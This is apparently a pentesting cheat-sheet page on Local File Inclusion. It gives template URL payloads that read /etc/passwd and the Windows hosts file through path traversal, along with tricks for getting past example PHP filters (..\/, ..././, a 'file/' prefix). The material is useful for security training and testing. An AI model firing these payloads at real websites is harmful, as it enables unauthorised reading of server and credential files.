---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Local File Inclusion

Also known as LFI, when an attacker can get a website to include a file that was not intended to be an option for this application.

Following we find a typical process for leveraging this vulnerability:

* Check if parameters in the URL receive the name of a file

{% code overflow="wrap" lineNumbers="true" %}
```bash
#It's searching for a file
http://$url/$query?$param=hola.php
#We can try to access the system files
http://$url/$query?$param=/etc/passwd
```
{% endcode %}

***

* When this doesn't work directly, we can try to get to the root folder

{% tabs %}
{% tab title="On Linux server" %}
{% code overflow="wrap" lineNumbers="true" %}
```bash
#We use ../ to get to the root directory
http://$url/$query?$param=../../../../../etc/passwd
```
{% endcode %}
{% endtab %}

{% tab title="On Windows server" %}
{% code overflow="wrap" lineNumbers="true" %}
```bash
#We use ../ to get to the root directory
http://$url/$query?$param=../../../../../../WINDOWS/system32/drivers/etc/hosts
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="info" %}
It is useful to put as many `../` as possible to get to the root folder
{% endhint %}

***

* Sometimes, we will need to check the page code to see the input conditions.

{% tabs %}
{% tab title="Case 1" %}
The code is searching for a file whose name starts with _file_

{% code title="Example source code" %}
```php
...
$file = str_replace( array( "../", "..\\" ), "", $file );
...
```
{% endcode %}

We can use the `\` to bypass this verification

```bash
http://$url/$query?$param=..\/..\/..\/..\/etc/passwd
```

Also if we use `..././` the code will do the replacement and leave us anyway with `../`, and we will also bypass this verification

```bash
http://$url/$query?$param=..././..././..././..././etc/passwd
```
{% endtab %}

{% tab title="Case 2" %}
The code is searching for a file whose name starts with _file_

{% code title="Example source code" overflow="wrap" lineNumbers="true" %}
```php
...
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
...
```
{% endcode %}

We can set our input to start with _file_ to bypass this verification

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/$query?$param=file/../../../../etc/passwd
```
{% endcode %}
{% endtab %}
{% endtabs %}
